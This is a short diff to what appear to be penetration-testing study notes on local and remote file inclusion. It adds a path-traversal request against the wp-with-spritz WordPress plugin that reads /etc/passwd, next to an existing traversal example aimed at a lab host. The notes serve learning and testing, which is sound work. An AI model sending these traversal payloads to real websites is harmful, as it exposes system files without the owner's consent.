@@ -14,6 +14,11 @@ WINDOWS\System32\drivers\etc\hosts
 http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts // If doesn't return in error, LFI is possible
 ```
 
+```bash
+<URL>/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd
+```
+
+
 RFI or Remote File Inclusion is similar to LFI but in this case it is possible for an attacker to load a remote
 file on the host using protocols like HTTP, FTP etc.
 
